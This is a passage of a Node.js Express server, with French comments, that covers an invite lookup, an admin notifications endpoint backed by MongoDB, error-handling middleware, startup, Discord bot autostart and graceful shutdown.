  const inv = await col("invites").findOne({ code: req.params.code }, { projection: { _id: 0 } });
  if (!inv) fail(404, "Invalid invite");
  return { code: inv.code, owner: inv.owner, label: inv.label ?? "" };
}));

// ================= ADMIN NOTIFICATIONS =================
api.get("/admin/notifications", ...admin, r(async (req) => {
  const q = req.query.since ? { created_at: { $gt: String(req.query.since) } } : {};
  const items = await col("admin_notifs").find(q, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(50).toArray();
  return { items, now: nowIso() };
}));

// ---------- Montage & gestion d'erreurs ----------
app.use("/api", api);

app.use((err, req, res, next) => {
  if (err instanceof HttpError) return res.status(err.status).json({ detail: err.detail });
  if (err?.type === "entity.parse.failed") return res.status(400).json({ detail: "Invalid JSON" });
  log.error("API error:", err);
  res.status(500).json({ detail: "Internal Server Error" });
});

// ---------- Démarrage ----------
const PORT = Number(process.env.PORT ?? 8000);
const server = app.listen(PORT, "0.0.0.0", () => log.info(`API on :${PORT}`));

// Démarre le bot s'il est configuré (token en base ou DISCORD_TOKEN), après 2 s
try {
  const cfg = await getConfig();
  if ((cfg.token || process.env.DISCORD_TOKEN || "").trim()) {
    setTimeout(() => startBot().then((x) => log.info(`startBot: ${x.message}`)).catch(noErr("bot start failed")), 2000);
  }
} catch (e) {
  log.warn(`bot autostart failed: ${e}`);
}

async function shutdown() {
  server.close();
  try { await stopBot(); } catch { /* ignoré */ }
  await state.mongo?.close();
  process.exit(0);
}
process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);